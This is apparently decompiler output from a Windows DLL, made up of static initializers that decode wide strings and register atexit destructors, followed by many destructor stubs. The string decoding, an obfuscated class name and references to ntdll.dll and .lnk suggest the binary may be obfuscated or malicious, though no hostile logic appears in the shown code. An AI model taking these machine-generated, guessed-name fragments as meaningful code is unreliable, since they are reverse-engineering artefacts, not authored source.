//----- (10089017) --------------------------------------------------------
int sub_10089017()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6FEC);
  sub_1000CC20(dword_100BF79C, v0);
  return atexit(sub_1008980D);
}
// 100BF79C: using guessed type _DWORD dword_100BF79C[2];

//----- (10089039) --------------------------------------------------------
int sub_10089039()
{
  int v1[11]; // [esp+0h] [ebp-2Ch] BYREF

  v1[7] = (int)v1;
  sub_10024B21(v1, 0);
  v1[10] = -1;
  sub_100284F7(v1[0], v1[1], (HANDLE)v1[2]);
  return atexit(sub_10089817);
}

//----- (10089073) --------------------------------------------------------
int sub_10089073()
{
  sub_1000CC20(dword_100BF7A4, asc_100B6F1C);
  return atexit(sub_10089821);
}
// 100B6F1C: using guessed type wchar_t asc_100B6F1C[2];
// 100BF7A4: using guessed type _DWORD dword_100BF7A4[2];

//----- (1008908E) --------------------------------------------------------
int sub_1008908E()
{
  sub_1000CC20(dword_100BF7AC, word_100B6F20);
  return atexit(sub_1008982B);
}
// 100B6F20: using guessed type wchar_t word_100B6F20[2];
// 100BF7AC: using guessed type _DWORD dword_100BF7AC[2];

//----- (100890A9) --------------------------------------------------------
int sub_100890A9()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6C4C);
  sub_1000CC20(dword_100BF7DC, v0);
  return atexit(sub_10089835);
}
// 100BF7DC: using guessed type _DWORD dword_100BF7DC[2];

//----- (100890CB) --------------------------------------------------------
int sub_100890CB()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6C7C);
  sub_1000CC20(dword_100BF7CC, v0);
  return atexit(sub_1008983F);
}
// 100BF7CC: using guessed type _DWORD dword_100BF7CC[2];

//----- (100890ED) --------------------------------------------------------
int sub_100890ED()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6CAC);
  sub_1000CC20(dword_100BF7D4, v0);
  return atexit(sub_10089849);
}
// 100BF7D4: using guessed type _DWORD dword_100BF7D4[2];

//----- (1008910F) --------------------------------------------------------
int sub_1008910F()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6CDC);
  sub_1000CC20(dword_100BF7B4, v0);
  return atexit(sub_10089853);
}
// 100BF7B4: using guessed type _DWORD dword_100BF7B4[2];

//----- (10089131) --------------------------------------------------------
int sub_10089131()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6D0C);
  sub_1000CC20(dword_100BF7C4, v0);
  return atexit(sub_1008985D);
}
// 100BF7C4: using guessed type _DWORD dword_100BF7C4[2];

//----- (10089153) --------------------------------------------------------
int sub_10089153()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6D3C);
  sub_1000CC20(dword_100BF7BC, v0);
  return atexit(sub_10089867);
}
// 100BF7BC: using guessed type _DWORD dword_100BF7BC[2];

//----- (10089175) --------------------------------------------------------
int sub_10089175()
{
  sub_10012A00(dword_100BF7E4, aLnk);
  return atexit(sub_10089871);
}
// 100B6B74: using guessed type wchar_t aLnk[4];
// 100BF7E4: using guessed type _DWORD dword_100BF7E4[2];

//----- (10089190) --------------------------------------------------------
int sub_10089190()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6A6C);
  sub_1000CC20(dword_100BF7EC, v0);
  return atexit(sub_1008987B);
}
// 100BF7EC: using guessed type _DWORD dword_100BF7EC[2];

//----- (100891B2) --------------------------------------------------------
int sub_100891B2()
{
  sub_1000CC20(dword_100BF7FC, aNtdllDll_5);
  return atexit(sub_10089885);
}
// 100B6AA8: using guessed type wchar_t aNtdllDll_5[10];
// 100BF7FC: using guessed type _DWORD dword_100BF7FC[2];

//----- (100891CD) --------------------------------------------------------
int sub_100891CD()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6AF0);
  sub_1000CC20(&dword_100BF804, v0);
  return atexit(sub_1008988F);
}
// 100BF804: using guessed type int dword_100BF804;

//----- (100891EF) --------------------------------------------------------
int sub_100891EF()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6ABC);
  sub_1000CC20(dword_100BF7F4, v0);
  return atexit(sub_10089899);
}
// 100BF7F4: using guessed type _DWORD dword_100BF7F4[2];

//----- (1008921B) --------------------------------------------------------
int sub_1008921B()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6954);
  sub_1000CC20(dword_100BF940, v0);
  return atexit(sub_100898A3);
}
// 100BF940: using guessed type _DWORD dword_100BF940[2];

//----- (1008923D) --------------------------------------------------------
int sub_1008923D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6990);
  sub_1000CC20(dword_100BF950, v0);
  return atexit(sub_100898AD);
}
// 100BF950: using guessed type _DWORD dword_100BF950[2];

//----- (1008925F) --------------------------------------------------------
int sub_1008925F()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B69E8);
  sub_1000CC20(dword_100BF948, v0);
  return atexit(sub_100898B7);
}
// 100BF948: using guessed type _DWORD dword_100BF948[2];

//----- (10089281) --------------------------------------------------------
int sub_10089281()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6768);
  sub_1000CC20(dword_100BF980, v0);
  return atexit(sub_100898C1);
}
// 100BF980: using guessed type _DWORD dword_100BF980[2];

//----- (100892A3) --------------------------------------------------------
int sub_100892A3()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B67B8);
  sub_1000CC20(dword_100BF988, v0);
  return atexit(sub_100898CB);
}
// 100BF988: using guessed type _DWORD dword_100BF988[2];

//----- (100892C5) --------------------------------------------------------
int sub_100892C5()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6734);
  sub_1000CC20(dword_100BF960, v0);
  return atexit(sub_100898D5);
}
// 100BF960: using guessed type _DWORD dword_100BF960[2];

//----- (100892E7) --------------------------------------------------------
int sub_100892E7()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B67F0);
  sub_1000CC20(dword_100BF978, v0);
  return atexit(sub_100898DF);
}
// 100BF978: using guessed type _DWORD dword_100BF978[2];

//----- (10089309) --------------------------------------------------------
int sub_10089309()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6868);
  sub_1000CC20(dword_100BF970, v0);
  return atexit(sub_100898E9);
}
// 100BF970: using guessed type _DWORD dword_100BF970[2];

//----- (1008932B) --------------------------------------------------------
int sub_1008932B()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B682C);
  sub_1000CC20(dword_100BF958, v0);
  return atexit(sub_100898F3);
}
// 100BF958: using guessed type _DWORD dword_100BF958[2];

//----- (1008934D) --------------------------------------------------------
int sub_1008934D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B68A8);
  sub_1000CC20(dword_100BF990, v0);
  return atexit(sub_100898FD);
}
// 100BF990: using guessed type _DWORD dword_100BF990[2];

//----- (1008936F) --------------------------------------------------------
int sub_1008936F()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6900);
  sub_1000CC20(dword_100BF968, v0);
  return atexit(sub_10089907);
}
// 100BF968: using guessed type _DWORD dword_100BF968[2];

//----- (10089391) --------------------------------------------------------
int sub_10089391()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6588);
  sub_1000CC20(dword_100BF9A0, v0);
  return atexit(sub_10089911);
}
// 100BF9A0: using guessed type _DWORD dword_100BF9A0[2];

//----- (100893B3) --------------------------------------------------------
int sub_100893B3()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6604);
  sub_1000CC20(dword_100BF998, v0);
  return atexit(sub_1008991B);
}
// 100BF998: using guessed type _DWORD dword_100BF998[2];

//----- (100893D5) --------------------------------------------------------
int sub_100893D5()
{
  sub_1004023F(dword_100BFAA0, 0);
  return atexit(sub_1008992F);
}
// 100BFAA0: using guessed type _DWORD dword_100BFAA0[2];

//----- (100893EF) --------------------------------------------------------
int sub_100893EF()
{
  sub_10041905(dword_100BFAA8, 0);
  return atexit(sub_10089925);
}
// 100BFAA8: using guessed type _DWORD dword_100BFAA8[2];

//----- (10089409) --------------------------------------------------------
int sub_10089409()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000E943((int)&unk_100B6540);
  sub_1000CC20(dword_100BF9A8, v0);
  return atexit(sub_10089939);
}
// 100BF9A8: using guessed type _DWORD dword_100BF9A8[2];

//----- (1008942B) --------------------------------------------------------
int sub_1008942B()
{
  sub_10044C62(dword_100BFAB0, 0);
  return atexit(sub_10089943);
}
// 100BFAB0: using guessed type _DWORD dword_100BFAB0[2];

//----- (10089450) --------------------------------------------------------
int sub_10089450()
{
  return atexit(sub_10089950);
}

//----- (10089460) --------------------------------------------------------
void __cdecl sub_10089460()
{
  sub_1000CE59((int *)&unk_100BF06C);
}

//----- (1008946A) --------------------------------------------------------
void __cdecl sub_1008946A()
{
  sub_1000CE59((int *)&unk_100BF580);
}

//----- (10089474) --------------------------------------------------------
void __cdecl sub_10089474()
{
  `eh vector destructor iterator'(&unk_100BF080, 8u, 38, (void (__thiscall *)(void *))sub_1000CE59);
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (10089488) --------------------------------------------------------
void __cdecl sub_10089488()
{
  sub_1000CE59((int *)&unk_100BF578);
}

//----- (10089492) --------------------------------------------------------
void __cdecl sub_10089492()
{
  sub_1000CE59(dword_100BF074);
}
// 100BF074: using guessed type int dword_100BF074[3];

//----- (1008949C) --------------------------------------------------------
void __cdecl sub_1008949C()
{
  `eh vector destructor iterator'(&unk_100BF1B0, 8u, 12, (void (__thiscall *)(void *))sub_1000CE59);
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (100894B0) --------------------------------------------------------
void __cdecl sub_100894B0()
{
  sub_1000CE59((int *)&unk_100BF064);
}

//----- (100894BA) --------------------------------------------------------
void __cdecl sub_100894BA()
{
  `eh vector destructor iterator'(&unk_100BF210, 8u, 14, (void (__thiscall *)(void *))sub_1000CE59);
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (100894CE) --------------------------------------------------------
void __cdecl sub_100894CE()
{
  sub_1000CE59((int *)&unk_100BF588);
}

//----- (100894D8) --------------------------------------------------------
void __cdecl sub_100894D8()
{
  `eh vector destructor iterator'(&unk_100BF280, 8u, 95, (void (__thiscall *)(void *))sub_1000CE59);
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (100894EC) --------------------------------------------------------
void __cdecl sub_100894EC()
{
  sub_10001651(dword_100BF9D4);
}
// 100BF9D4: using guessed type _DWORD dword_100BF9D4[2];

//----- (100894F6) --------------------------------------------------------
void __cdecl sub_100894F6()
{
  sub_1000CE59(&dword_100BF9C4);
}
// 100BF9C4: using guessed type int dword_100BF9C4;

//----- (10089500) --------------------------------------------------------
void __cdecl sub_10089500()
{
  sub_10001834(dword_100BF9CC);
}
// 100BF9CC: using guessed type _DWORD dword_100BF9CC[2];

//----- (1008950A) --------------------------------------------------------
void __cdecl sub_1008950A()
{
  sub_1000CE59((int *)&unk_100BF5A0);
}

//----- (10089514) --------------------------------------------------------
void __cdecl sub_10089514()
{
  sub_1000CE59(dword_100BF5A8);
}
// 100BF5A8: using guessed type _DWORD dword_100BF5A8[2];

//----- (1008951E) --------------------------------------------------------
void __cdecl sub_1008951E()
{
  sub_1000CE59(dword_100BF590);
}
// 100BF590: using guessed type _DWORD dword_100BF590[2];

//----- (10089528) --------------------------------------------------------
void __cdecl sub_10089528()
{
  sub_1000CE59((int *)&unk_100BF5B8);
}

//----- (10089532) --------------------------------------------------------
void __cdecl sub_10089532()
{
  sub_1000CE59((int *)&unk_100BF5C0);
}

//----- (1008953C) --------------------------------------------------------
void __cdecl sub_1008953C()
{
  sub_1000CE59((int *)&unk_100BF598);
}

//----- (10089546) --------------------------------------------------------
void __cdecl sub_10089546()
{
  sub_1000CE59((int *)&unk_100BF5B0);
}

//----- (10089550) --------------------------------------------------------
void __cdecl sub_10089550()
{
  sub_1000341E(dword_100BF9DC);
}
// 100BF9DC: using guessed type _DWORD dword_100BF9DC[2];

//----- (1008955A) --------------------------------------------------------
void __cdecl sub_1008955A()
{
  sub_1000276C(&off_100BC730);
}
// 100BC730: using guessed type int (__thiscall **off_100BC730)(void *Block, char);

//----- (10089564) --------------------------------------------------------
void __cdecl sub_10089564()
{
  sub_100172B1(dword_100BF9E4);
}
// 100BF9E4: using guessed type int dword_100BF9E4[9];

//----- (1008956E) --------------------------------------------------------
void __cdecl sub_1008956E()
{
  sub_1000CE59((int *)&unk_100BF608);
}

//----- (10089578) --------------------------------------------------------
void __cdecl sub_10089578()
{
  sub_10001B27((int)dword_100BC5A4);
}
// 100BC5A4: using guessed type _DWORD dword_100BC5A4[3];

//----- (10089583) --------------------------------------------------------
void __cdecl sub_10089583()
{
  sub_1000CE59((int *)&unk_100BF5E8);
}

//----- (1008958D) --------------------------------------------------------
void __cdecl sub_1008958D()
{
  sub_1000CE59((int *)&unk_100BF5F8);
}

//----- (10089597) --------------------------------------------------------
void __cdecl sub_10089597()
{
  sub_1000CE59((int *)&unk_100BF5F0);
}

//----- (100895A1) --------------------------------------------------------
void __cdecl sub_100895A1()
{
  sub_1000CE59((int *)&unk_100BF5C8);
}

//----- (100895AB) --------------------------------------------------------
void __cdecl sub_100895AB()
{
  sub_1000CE59((int *)&unk_100BF5D0);
}

//----- (100895B5) --------------------------------------------------------
void __cdecl sub_100895B5()
{
  sub_1000CE59((int *)&unk_100BF600);
}

//----- (100895BF) --------------------------------------------------------
void __cdecl sub_100895BF()
{
  sub_1000CE59((int *)&unk_100BF5E0);
}

//----- (100895C9) --------------------------------------------------------
void __cdecl sub_100895C9()
{
  sub_1000CE59((int *)&unk_100BF5D8);
}

//----- (100895D3) --------------------------------------------------------
void __cdecl sub_100895D3()
{
  sub_100064EA(&dword_100BBBE0);
}
// 100BBBE0: using guessed type int dword_100BBBE0;

//----- (100895DE) --------------------------------------------------------
void __cdecl sub_100895DE()
{
  sub_100064EA(&dword_100BBC0C);
}
// 100BBC0C: using guessed type int dword_100BBC0C;

//----- (100895E9) --------------------------------------------------------
void __cdecl sub_100895E9()
{
  sub_1000CE59((int *)&unk_100BF618);
}

//----- (100895F3) --------------------------------------------------------
void __cdecl sub_100895F3()
{
  sub_1000CE59((int *)&unk_100BF610);
}

//----- (100895FD) --------------------------------------------------------
void __cdecl sub_100895FD()
{
  sub_10008601(&off_100BC738);
}
// 100BC738: using guessed type int (__thiscall **off_100BC738)(void *Block, char);

//----- (10089607) --------------------------------------------------------
void __cdecl sub_10089607()
{
  sub_100172B1(dword_100BFA08);
}
// 100BFA08: using guessed type int dword_100BFA08[9];

//----- (10089611) --------------------------------------------------------
void __cdecl sub_10089611()
{
  sub_100089F4(&dword_100BC5D0);
}
// 100BC5D0: using guessed type int dword_100BC5D0;

//----- (1008961C) --------------------------------------------------------
void __cdecl sub_1008961C()
{
  sub_100089F4(&dword_100BC5F4);
}
// 100BC5F4: using guessed type int dword_100BC5F4;

//----- (10089627) --------------------------------------------------------
void __cdecl sub_10089627()
{
  sub_1000CE59((int *)&unk_100BF620);
}

//----- (10089631) --------------------------------------------------------
void __cdecl sub_10089631()
{
  sub_1000CE59((int *)&unk_100BF628);
}

//----- (1008963B) --------------------------------------------------------
void __cdecl sub_1008963B()
{
  `eh vector destructor iterator'(&unk_100BF630, 8u, 9, (void (__thiscall *)(void *))sub_1000CE59);
}
// 1004C973: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *));

//----- (1008964F) --------------------------------------------------------
void __cdecl sub_1008964F()
{
  sub_1000AC0D(dword_100BFA44);
}
// 100BFA44: using guessed type _DWORD dword_100BFA44[2];

//----- (10089659) --------------------------------------------------------
void __cdecl sub_10089659()
{
  sub_1000A9D3(dword_100BFA2C);
}
// 100BFA2C: using guessed type _DWORD dword_100BFA2C[2];

//----- (10089663) --------------------------------------------------------
void __cdecl sub_10089663()
{
  sub_1000AEE5(dword_100BFA38);
}
// 100BFA38: using guessed type _DWORD dword_100BFA38[2];

//----- (1008966D) --------------------------------------------------------
void __cdecl sub_1008966D()
{
  sub_1000CE59((int *)&unk_100BF680);
}

//----- (10089677) --------------------------------------------------------
void __cdecl sub_10089677()
{
  sub_1000CE59(dword_100BF690);
}
// 100BF690: using guessed type _DWORD dword_100BF690[2];

//----- (10089681) --------------------------------------------------------
void __cdecl sub_10089681()
{
  sub_1000CE59((int *)&unk_100BF688);
}

//----- (1008968B) --------------------------------------------------------
void __cdecl sub_1008968B()
{
  sub_1000CE59((int *)&unk_100BF678);
}

//----- (1008969A) --------------------------------------------------------
void __cdecl sub_1008969A()
{
  sub_1000CE59((int *)&unk_100BF698);
}

//----- (100896A4) --------------------------------------------------------
void __cdecl sub_100896A4()
{
  sub_1000CE59((int *)&unk_100BF6B0);
}

//----- (100896AE) --------------------------------------------------------
void __cdecl sub_100896AE()
{
  sub_1000CE59((int *)&unk_100BF6A8);
}

//----- (100896B8) --------------------------------------------------------
void __cdecl sub_100896B8()
{
  sub_1000CE59((int *)&unk_100BF6A0);
}

//----- (100896C2) --------------------------------------------------------
void __cdecl sub_100896C2()
{
  sub_1000F887(&off_100BC740);
}
// 100BC740: using guessed type int (__thiscall **off_100BC740)(void *Block, char);

//----- (100896CC) --------------------------------------------------------
void __cdecl sub_100896CC()
{
  sub_100172B1(dword_100BFA4C);
}
// 100BFA4C: using guessed type int dword_100BFA4C[9];

//----- (100896D6) --------------------------------------------------------
void __cdecl sub_100896D6()
{
  sub_1000CE59((int *)&unk_100BF6E0);
}

//----- (100896E0) --------------------------------------------------------
void __cdecl sub_100896E0()
{
  sub_1000CE59((int *)&unk_100BF6E8);
}

//----- (100896EA) --------------------------------------------------------
void __cdecl sub_100896EA()
{
  sub_1000CE59(&dword_100BF6C8);
}
// 100BF6C8: using guessed type int dword_100BF6C8;

//----- (100896F4) --------------------------------------------------------
void __cdecl sub_100896F4()
{
  sub_1000CE59(&dword_100BF6C0);
}
// 100BF6C0: using guessed type int dword_100BF6C0;

//----- (100896FE) --------------------------------------------------------
void __cdecl sub_100896FE()
{
  sub_1000CE59((int *)&unk_100BF6B8);
}

//----- (10089708) --------------------------------------------------------
void __cdecl sub_10089708()
{
  sub_1000CE59(&dword_100BF6D8);
}
// 100BF6D8: using guessed type int dword_100BF6D8;

//----- (10089712) --------------------------------------------------------
void __cdecl sub_10089712()
{
  sub_1000CE59(&dword_100BF6D0);
}
// 100BF6D0: using guessed type int dword_100BF6D0;

//----- (1008971C) --------------------------------------------------------
void __cdecl sub_1008971C()
{
  sub_10015D5D((void **)&off_100BC748);
}
// 100BC748: using guessed type int (__thiscall **off_100BC748)(void *Block, char);

//----- (10089726) --------------------------------------------------------
void __cdecl sub_10089726()
{
  sub_100172B1(dword_100BFA70);
}
// 100BFA70: using guessed type int dword_100BFA70[9];

//----- (10089730) --------------------------------------------------------
void __cdecl sub_10089730()
{
  sub_1002A1ED(&dword_100BF6F0);
}
// 100BF6F0: using guessed type _DWORD dword_100BF6F0;

//----- (1008973A) --------------------------------------------------------
void __cdecl sub_1008973A()
{
  sub_1000CE59((int *)&unk_100BF6F8);
}

//----- (10089744) --------------------------------------------------------
void __cdecl sub_10089744()
{
  sub_1000CE59((int *)&unk_100BF728);
}

//----- (1008974E) --------------------------------------------------------
void __cdecl sub_1008974E()
{
  sub_1000CE59((int *)&unk_100BF720);
}

//----- (10089758) --------------------------------------------------------
void __cdecl sub_10089758()
{
  sub_1000CE59((int *)&unk_100BF700);
}

//----- (10089762) --------------------------------------------------------
void __cdecl sub_10089762()
{
  sub_1000CE59((int *)&unk_100BF708);
}

//----- (1008976C) --------------------------------------------------------
void __cdecl sub_1008976C()
{
  sub_1000CE59((int *)&unk_100BF718);
}

//----- (10089776) --------------------------------------------------------
void __cdecl sub_10089776()
{
  sub_1000CE59((int *)&unk_100BF710);
}

//----- (10089780) --------------------------------------------------------
void __cdecl sub_10089780()
{
  sub_1000CE59((int *)&unk_100BF730);
}

//----- (1008978A) --------------------------------------------------------
void __cdecl sub_1008978A()
{
  sub_1000CE59((int *)&unk_100BF738);
}

//----- (10089794) --------------------------------------------------------
void __cdecl sub_10089794()
{
  sub_1000CE59((int *)&unk_100BF740);
}

//----- (1008979F) --------------------------------------------------------
void __cdecl sub_1008979F()
{
  sub_1000CE59(&dword_100BF74C);
}
// 100BF74C: using guessed type int dword_100BF74C;

//----- (100897A9) --------------------------------------------------------
void __cdecl sub_100897A9()
{
  sub_1000CE59((int *)&unk_100BF76C);
}

//----- (100897B3) --------------------------------------------------------
void __cdecl sub_100897B3()
{
  sub_1000CE59((int *)&unk_100BF764);
}

//----- (100897BD) --------------------------------------------------------
void __cdecl sub_100897BD()
{
  sub_1000CE59((int *)&unk_100BF754);
}

//----- (100897C7) --------------------------------------------------------
void __cdecl sub_100897C7()
{
  sub_1000CE59((int *)&unk_100BF75C);
}

//----- (100897D1) --------------------------------------------------------
void __cdecl sub_100897D1()
{
  sub_1002A1ED(&dword_100BF774);
}
// 100BF774: using guessed type _DWORD dword_100BF774;

//----- (100897DB) --------------------------------------------------------
void __cdecl sub_100897DB()
{
  sub_1000CE59((int *)&unk_100BF77C);
}

//----- (100897E5) --------------------------------------------------------
void __cdecl sub_100897E5()
{
  sub_1000CE59((int *)&unk_100BF794);
}

//----- (100897EF) --------------------------------------------------------
void __cdecl sub_100897EF()
{
  sub_1000CE59((int *)&unk_100BF784);
}

//----- (100897F9) --------------------------------------------------------
void __cdecl sub_100897F9()
{
  sub_1000CE59((int *)&unk_100BF78C);
}

//----- (10089803) --------------------------------------------------------
void __cdecl sub_10089803()
{
  sub_10024B5F(dword_100BFA94);
}
// 100BFA94: using guessed type _DWORD dword_100BFA94[3];

//----- (1008980D) --------------------------------------------------------
void __cdecl sub_1008980D()
{
  sub_1000CE59((int *)&unk_100BF79C);
}

//----- (10089817) --------------------------------------------------------
void __cdecl sub_10089817()
{
  sub_10028575((LPVOID *)&dword_100BBC40);
}
// 100BBC40: using guessed type int dword_100BBC40;

//----- (10089821) --------------------------------------------------------
void __cdecl sub_10089821()
{
  sub_1000CE59((int *)&unk_100BF7A4);
}

//----- (1008982B) --------------------------------------------------------
void __cdecl sub_1008982B()
{
  sub_1000CE59((int *)&unk_100BF7AC);
}

//----- (10089835) --------------------------------------------------------
void __cdecl sub_10089835()
{
  sub_1000CE59((int *)&unk_100BF7DC);
}

//----- (1008983F) --------------------------------------------------------
void __cdecl sub_1008983F()
{
  sub_1000CE59((int *)&unk_100BF7CC);
}

//----- (10089849) --------------------------------------------------------
void __cdecl sub_10089849()
{
  sub_1000CE59((int *)&unk_100BF7D4);
}

//----- (10089853) --------------------------------------------------------
void __cdecl sub_10089853()
{
  sub_1000CE59((int *)&unk_100BF7B4);
}

//----- (1008985D) --------------------------------------------------------
void __cdecl sub_1008985D()
{
  sub_1000CE59((int *)&unk_100BF7C4);
}

//----- (10089867) --------------------------------------------------------
void __cdecl sub_10089867()
{
  sub_1000CE59((int *)&unk_100BF7BC);
}

//----- (10089871) --------------------------------------------------------
void __cdecl sub_10089871()
{
  sub_10012AAC((int *)&unk_100BF7E4);
}

//----- (1008987B) --------------------------------------------------------
void __cdecl sub_1008987B()
{
  sub_1000CE59((int *)&unk_100BF7EC);
}

//----- (10089885) --------------------------------------------------------
void __cdecl sub_10089885()
{
  sub_1000CE59((int *)&unk_100BF7FC);
}

//----- (1008988F) --------------------------------------------------------
void __cdecl sub_1008988F()
{
  sub_1000CE59(&dword_100BF804);
}
// 100BF804: using guessed type int dword_100BF804;

//----- (10089899) --------------------------------------------------------
void __cdecl sub_10089899()
{
  sub_1000CE59((int *)&unk_100BF7F4);
}

//----- (100898A3) --------------------------------------------------------
void __cdecl sub_100898A3()
{
  sub_1000CE59((int *)&unk_100BF940);
}

//----- (100898AD) --------------------------------------------------------
void __cdecl sub_100898AD()
{
  sub_1000CE59((int *)&unk_100BF950);
}

//----- (100898B7) --------------------------------------------------------
void __cdecl sub_100898B7()
{
  sub_1000CE59((int *)&unk_100BF948);
}

//----- (100898C1) --------------------------------------------------------
void __cdecl sub_100898C1()
{
  sub_1000CE59((int *)&unk_100BF980);
}

//----- (100898CB) --------------------------------------------------------
void __cdecl sub_100898CB()
{
  sub_1000CE59((int *)&unk_100BF988);
}

//----- (100898D5) --------------------------------------------------------
void __cdecl sub_100898D5()
{
  sub_1000CE59((int *)&unk_100BF960);
}

//----- (100898DF) --------------------------------------------------------
void __cdecl sub_100898DF()
{
  sub_1000CE59((int *)&unk_100BF978);
}

//----- (100898E9) --------------------------------------------------------
void __cdecl sub_100898E9()
{
  sub_1000CE59((int *)&unk_100BF970);
}

//----- (100898F3) --------------------------------------------------------
void __cdecl sub_100898F3()
{
  sub_1000CE59((int *)&unk_100BF958);
}

//----- (100898FD) --------------------------------------------------------
void __cdecl sub_100898FD()
{
  sub_1000CE59((int *)&unk_100BF990);
}

//----- (10089907) --------------------------------------------------------
void __cdecl sub_10089907()
{
  sub_1000CE59((int *)&unk_100BF968);
}

//----- (10089911) --------------------------------------------------------
void __cdecl sub_10089911()
{
  sub_1000CE59((int *)&unk_100BF9A0);
}

//----- (1008991B) --------------------------------------------------------
void __cdecl sub_1008991B()
{
  sub_1000CE59((int *)&unk_100BF998);
}

//----- (10089925) --------------------------------------------------------
void __cdecl sub_10089925()
{
  sub_1004081F(dword_100BFAA8);
}
// 100BFAA8: using guessed type _DWORD dword_100BFAA8[2];

//----- (1008992F) --------------------------------------------------------
void __cdecl sub_1008992F()
{
  sub_10040283(dword_100BFAA0);
}
// 100BFAA0: using guessed type _DWORD dword_100BFAA0[2];

//----- (10089939) --------------------------------------------------------
void __cdecl sub_10089939()
{
  sub_1000CE59((int *)&unk_100BF9A8);
}

//----- (10089943) --------------------------------------------------------
void __cdecl sub_10089943()
{
  sub_100448D2(dword_100BFAB0);
}
// 100BFAB0: using guessed type _DWORD dword_100BFAB0[2];

//----- (10089950) --------------------------------------------------------
void __cdecl sub_10089950()
{
  VariantClear(&pvarg);
}

//----- (1008995C) --------------------------------------------------------
void __cdecl sub_1008995C()
{
  dword_100BC8E8 = (int)&ikc::izq_ezibc::`vftable';
  sub_10053658(&dword_100BC8E8);
}
